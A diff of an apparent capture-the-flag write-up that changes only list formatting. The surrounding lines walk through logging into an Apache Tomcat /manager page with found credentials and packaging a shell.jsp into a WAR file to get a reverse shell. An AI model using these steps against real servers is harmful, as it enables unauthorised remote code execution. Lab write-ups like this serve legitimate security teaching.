@@ -70,7 +70,7 @@ This will give the version of the server `Apache/2.4.18`.
 
 ### Method 2 - Manual Exploitation
 If you face any problem in running the exploit in metasploit, we can just upload the shell directly into the webpage. If we simply do some research that `how can we get reverse shell in Apache Tomcat/7.0.88?`, we will come to know that the directory `/manager` can help us here. So just open this directory `http://<IP_ADDRESS>/manager`. This will ask for the credentials. Simply use the credentials that we got before `bob, bubbles`. This will open a server page for the manager. Here we can see an option for uploading `war` files. Create a war file using the following steps:
--> create a shell.jsp file with the following contents:
+- create a shell.jsp file with the following contents:
 ```bash
 <%@ page import="java.io.*" %>
 <%
@@ -86,7 +86,7 @@ If you face any problem in running the exploit in metasploit, we can just upload
 %>
 ```
 
-run the commands:
+- run the commands:
 ```bash
 mkdir -p mywebapp/WEB-INF
 cp shell.jsp mywebapp/
